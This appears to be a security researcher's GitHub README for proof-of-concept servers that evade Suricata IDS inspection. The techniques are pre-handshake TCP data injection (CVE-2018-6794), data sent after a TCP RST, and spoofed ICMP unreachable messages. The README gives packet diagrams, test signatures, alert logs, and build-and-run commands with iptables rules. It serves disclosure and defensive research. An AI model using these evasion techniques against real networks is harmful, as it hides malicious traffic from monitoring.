## Disclaimer

These programs is for Educational purpose ONLY. Do not use it without permission.

## inject_server: Proof-Of-Concept for CVE-2018-6794.

If as a server side you break a normal TCP 3 way handshake packets order and inject some response data before 3whs is complete then data still will be received by the client but some IDS engines may skip content checks on that.

```
Client    ->  [SYN] [Seq=0 Ack=0]           ->  Evil Server     # Client starts a TCP 3-way handshake
Client    <-  [SYN, ACK] [Seq=0 Ack=1]      <-  Evil Server     # Server responses as it should, but ...
Client    <-  [PSH, ACK] [Seq=1 Ack=1]      <-  Evil Server     # It sends HTTP response before the 3whs is completed
Client    <-  [FIN, ACK] [Seq=83 Ack=1]     <-  Evil Server     # Moreover it finishes TCP session 
Client    ->  [ACK] [Seq=1 Ack=84]          ->  Evil Server     # Client finishes TCP 3whs by sending ACK packet and confirms data from server
Client    ->  [PSH, ACK] [Seq=1 Ack= 4]     ->  Evil Server     # Then it sends a HTTP GET request as nothing wrong happened
```

Suricata IDS < 4.0.4 is prone to this issue: HTTP or Stream-TCP signatures will not alert on the injected content.
We do not see any alerts on an evil http response data if we apply the following signatures against PoC network traffic 

```
alert tcp any any -> any any (msg: "TCP BEEN NO_STREAM RULE"; flow: no_stream; content: "been"; sid: 1; )
alert tcp any any -> any any (msg: "TCP BEEN ONLY_STREAM RULE"; flow: only_stream; content: "been"; sid: 2; )
alert http any any -> any any (msg: "HTTP BEEN RULE"; content: "been"; sid: 3; )
alert tcp any any -> any any (msg: "TCP GET NO_STREAM RULE"; flow: no_stream; content: "GET"; sid: 4; )
alert tcp any any -> any any (msg: "TCP GET ONLY_STREAM RULE"; flow: only_stream; content: "GET"; sid: 5; )
alert http any any -> any any (msg: "HTTP GET RULE"; content: "GET"; sid: 6; )

03/02/2018-11:08:13.012990  [**] [1:1:0] TCP BEEN NO_STREAM RULE [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.235.101:80 -> 192.168.235.1:56581
03/02/2018-11:08:13.013610  [**] [1:4:0] TCP GET NO_STREAM RULE [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.235.1:56581 -> 192.168.235.101:80
03/02/2018-11:08:13.018914  [**] [1:5:0] TCP GET ONLY_STREAM RULE [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.235.1:56581 -> 192.168.235.101:80
03/02/2018-11:08:13.018914  [**] [1:6:0] HTTP GET RULE [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.235.1:56581 -> 192.168.235.101:80
```

## rst_server: Proof-Of-Concept for IDS bypass.

Windows clients are able to process TCP data even if they arrived shortly after TCP RST packet. Some IDSes process this correctly and try to match data after RST but some stops inpecting TCP stream after RST was received.

```
Client    ->  [SYN] [Seq=0 Ack=0]           ->  Evil Server     # Client starts a TCP 3-way handshake
Client    <-  [RST, ACK] [Seq=0x0 Ack=1]    <-  Evil Server     # Server responses with TCP RST
Client    <-  [SYN, ACK] [Seq=1 Ack=1]      <-  Evil Server     # And SYN-ACK shortly after RST
           ... 3whs continues ...
```

Suricata IDS is still prone to this issue: HTTP or Stream-TCP signatures will not alert on this TCP session.

```
alert tcp any any -> any any (msg: "TCP BEEN NO_STREAM RULE"; flow: no_stream; content: "been"; sid: 1; )
alert tcp any any -> any any (msg: "TCP BEEN ONLY_STREAM RULE"; flow: only_stream; content: "been"; sid: 2; )
alert http any any -> any any (msg: "HTTP BEEN RULE"; content: "been"; sid: 3; )
alert tcp any any -> any any (msg: "TCP GET NO_STREAM RULE"; flow: no_stream; content: "GET"; sid: 4; )
alert tcp any any -> any any (msg: "TCP GET ONLY_STREAM RULE"; flow: only_stream; content: "GET"; sid: 5; )
alert http any any -> any any (msg: "HTTP GET RULE"; content: "GET"; sid: 6; )

05/03/2018-19:13:43.270632  [**] [1:4:0] TCP GET NO_STREAM RULE [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.235.1:53434 -> 192.168.235.101:80
05/03/2018-19:13:43.471128  [**] [1:1:0] TCP BEEN NO_STREAM RULE [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.235.101:80 -> 192.168.235.1:53434
```

## icmp_server: Proof-Of-Concept for IDS bypass.

Server should reply with ICMP message type "Destination Unreachable" code "Port Unreachable" if a UDP packet was sent to a closed UDP port. IDS may interpret ICMP Unreachable answers on the same way as TCP RST packets and stop or limit traffic inspection of this UDP stream. If a normal UDP answer follows the ICMP message then attacker bypasses UDP checks of traffic from his server. Note that normal clients close connections if ICMP Dest. Unreachable was received so we interchange IP addresses and UDP ports in ICMP message's attached UDP so client does not accept such ICMP message but IDS does.

```
Client    ->  [UDP Req]                  ->  Evil Server     # Client starts UDP session by sending a packet 
Client    <-  [ICMP] [Type=3, Code=3]    <-  Evil Server     # Server responses with *improved* ICMP Destination Unreachable first
Client    <-  [UDP Resp]                 <-  Evil Server     # And with UDP answer as usual
```

Suricata IDS < 3.1.2 is prone to this issue: UDP signatures will not match on packets from Evil Server.

```
alert udp any any -> any any (msg: "UDP BEEN RULE"; content: "been"; sid: 1; )
alert udp any any -> any any (msg: "UDP HELLO RULE"; content: "hello"; sid: 2; )

05/03/2018-03:44:11.016635  [**] [1:2:0] UDP HELLO RULE [**] [Classification: (null)] [Priority: 3] {UDP} 192.168.235.100:46599 -> 192.168.235.101:80
```

This techniques may be applied for other Intrusion Detection or Network Monitoring tools and systems.

## Author and Credits
Kirill Shipulin from Positive Technologies (@kirill_wow)

## Usage
```
git clone https://github.com/kirillwow/ids_bypass.git
cd ids_bypass
make
# inject server
sudo iptables -A OUTPUT -p tcp --sport 80 --tcp-flags RST RST -j DROP
sudo ./inject_server # print help
sudo ./inject_server -i eno16777736 -p 80
# rst server
sudo iptables -A OUTPUT -p tcp -o eno16777736 --sport 80 -m owner --uid-owner 0 --tcp-flags RST RST -j ACCEPT
sudo iptables -A OUTPUT -p tcp -o eno16777736 --sport 80 --tcp-flags RST RST -j DROP
sudo ./rst_server # print help
sudo ./rst_server -i eno16777736 -p 80
# icmp server
sudo iptables -A OUTPUT -o eno16777736 -p icmp --icmp-type destination-unreachable -m owner --uid-owner 0 -j ACCEPT
sudo iptables -A OUTPUT -o eno16777736 -p icmp --icmp-type destination-unreachable -j DROP
sudo ./icmp_server # print help
sudo ./icmp_server -i eno16777736 -p 80
```


![alt PoC](https://github.com/kirillwow/ids_bypass/raw/master/screenshot.png)
